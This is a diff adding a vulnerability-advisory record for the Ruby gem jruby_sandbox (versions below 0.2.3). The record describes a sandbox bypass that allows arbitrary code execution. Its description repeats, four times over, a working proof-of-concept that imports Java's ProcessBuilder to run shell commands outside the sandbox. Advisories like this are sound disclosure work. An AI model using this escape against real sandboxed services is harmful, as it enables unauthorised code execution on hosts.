@@ -1,0 +1,62 @@
+---
+- id: snykio:rubygems:jruby_sandbox:2014-04-23
+  title: Arbitrary Code Execution
+  description: "[`jruby_sandbox`][1] is a version of `_why's Freaky Freaky Sandbox`
+    for\nJRuby. Affected versions of this gem are vulnerable to sandbox bypassing\nfor
+    arbitrary code execution while importing Java classes.\n\n\n\n[1]: https://rubygems.org/gems/jruby_sandbox\n\\n[`jruby_sandbox`][1]
+    is a version of `_why's Freaky Freaky Sandbox` for\nJRuby. Affected versions of
+    this gem are vulnerable to sandbox bypassing\nfor arbitrary code execution while
+    importing Java classes.\n\n\n\n[1]: https://rubygems.org/gems/jruby_sandbox\n\\n`jruby_sandbox`
+    aims to allow safe execution of user given Ruby code\nwithin a JRuby \\[0\\] runtime.
+    However via import of Java classes it is\npossible to circumvent those protections
+    and execute arbitrary code\noutside the sandboxed environment.\n\n**Example:**\n\n
+    \   require 'sandbox'\n    sand = Sandbox.safe\n    sand.activate!\n    \n    begin\n
+    \     sand.eval(\"print `id`\")\n    rescue Exception => e\n      puts \"fail
+    via Ruby ;)\"\n    end\n    puts \"Now for some Java\"\n    \n    sand.eval(\"Kernel.send
+    :java_import, 'java.lang.ProcessBuilder'\")\n    sand.eval(\"Kernel.send :java_import,
+    'java.util.Scanner'\")\n    sand.eval(\"s = Java::java.util.Scanner.new( \" +\n
+    \             \"Java::java.lang.ProcessBuilder.new('sh','-c','id')\" +\n              \".start.getInputStream
+    \ ).useDelimiter(\\\"\\x00\\\").next\")\n    sand.eval(\"print s\")\n\n\\n`jruby_sandbox`
+    aims to allow safe execution of user given Ruby code\nwithin a JRuby \\[0\\] runtime.
+    However via import of Java classes it is\npossible to circumvent those protections
+    and execute arbitrary code\noutside the sandboxed environment.\n\n**Example:**\n\n
+    \   require 'sandbox'\n    sand = Sandbox.safe\n    sand.activate!\n    \n    begin\n
+    \     sand.eval(\"print `id`\")\n    rescue Exception => e\n      puts \"fail
+    via Ruby ;)\"\n    end\n    puts \"Now for some Java\"\n    \n    sand.eval(\"Kernel.send
+    :java_import, 'java.lang.ProcessBuilder'\")\n    sand.eval(\"Kernel.send :java_import,
+    'java.util.Scanner'\")\n    sand.eval(\"s = Java::java.util.Scanner.new( \" +\n
+    \             \"Java::java.lang.ProcessBuilder.new('sh','-c','id')\" +\n              \".start.getInputStream
+    \ ).useDelimiter(\\\"\\x00\\\").next\")\n    sand.eval(\"print s\")\n\n\\n`jruby_sandbox`
+    aims to allow safe execution of user given Ruby code\nwithin a JRuby \\[0\\] runtime.
+    However via import of Java classes it is\npossible to circumvent those protections
+    and execute arbitrary code\noutside the sandboxed environment.\n\n**Example:**\n\n
+    \   require 'sandbox'\n    sand = Sandbox.safe\n    sand.activate!\n    \n    begin\n
+    \     sand.eval(\"print `id`\")\n    rescue Exception => e\n      puts \"fail
+    via Ruby ;)\"\n    end\n    puts \"Now for some Java\"\n    \n    sand.eval(\"Kernel.send
+    :java_import, 'java.lang.ProcessBuilder'\")\n    sand.eval(\"Kernel.send :java_import,
+    'java.util.Scanner'\")\n    sand.eval(\"s = Java::java.util.Scanner.new( \" +\n
+    \             \"Java::java.lang.ProcessBuilder.new('sh','-c','id')\" +\n              \".start.getInputStream
+    \ ).useDelimiter(\\\"\\x00\\\").next\")\n    sand.eval(\"print s\")\n\n\\n`jruby_sandbox`
+    aims to allow safe execution of user given Ruby code\nwithin a JRuby \\[0\\] runtime.
+    However via import of Java classes it is\npossible to circumvent those protections
+    and execute arbitrary code\noutside the sandboxed environment.\n\n**Example:**\n\n
+    \   require 'sandbox'\n    sand = Sandbox.safe\n    sand.activate!\n    \n    begin\n
+    \     sand.eval(\"print `id`\")\n    rescue Exception => e\n      puts \"fail
+    via Ruby ;)\"\n    end\n    puts \"Now for some Java\"\n    \n    sand.eval(\"Kernel.send
+    :java_import, 'java.lang.ProcessBuilder'\")\n    sand.eval(\"Kernel.send :java_import,
+    'java.util.Scanner'\")\n    sand.eval(\"s = Java::java.util.Scanner.new( \" +\n
+    \             \"Java::java.lang.ProcessBuilder.new('sh','-c','id')\" +\n              \".start.getInputStream
+    \ ).useDelimiter(\\\"\\x00\\\").next\")\n    sand.eval(\"print s\")\n\n"
+  affected_package: jruby_sandbox
+  vulnerable_versions:
+  - "< 0.2.3"
+  severity: high
+  package_manager: rubygems
+  cwe:
+  - CWE-94
+  credit:
+  - joernchen
+  references:
+  - http://rubysec.com/advisories/OSVDB-106279
+  - http://www.phenoelit.org/stuff/jruby-sandbox.txt
+  source_url: https://snyk.io/vuln/SNYK-RUBY-JRUBYSANDBOX-20156
